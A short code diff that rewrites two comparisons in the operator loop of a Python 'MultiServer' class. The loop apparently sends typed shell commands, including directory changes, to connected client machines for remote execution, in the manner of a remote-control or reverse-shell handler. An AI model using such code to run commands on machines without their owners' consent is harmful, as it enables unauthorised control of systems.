@@ -414,7 +414,7 @@ class MultiServer(object):
         print('Tip: help("modules") lists available modules')
         while 1:
             command = input('>> ')
-            if command == 'exit' or command == 'exit()':
+            if command in ['exit', 'exit()']:
                 break
             output, error = self.client_exec(conn, command)
             if error == None:
@@ -435,7 +435,7 @@ class MultiServer(object):
                 print(cwd)
             return cwd
         split_command = command.split(' ')[0].strip().lower()
-        if split_command == 'cd' or split_command == 'chdir':
+        if split_command in ['cd', 'chdir']:
             self.send(conn, json_dumps(['SHELL', command]))
             cwd = json.loads(self.receive(conn).decode())
             if cwd[0] == 'ERROR':
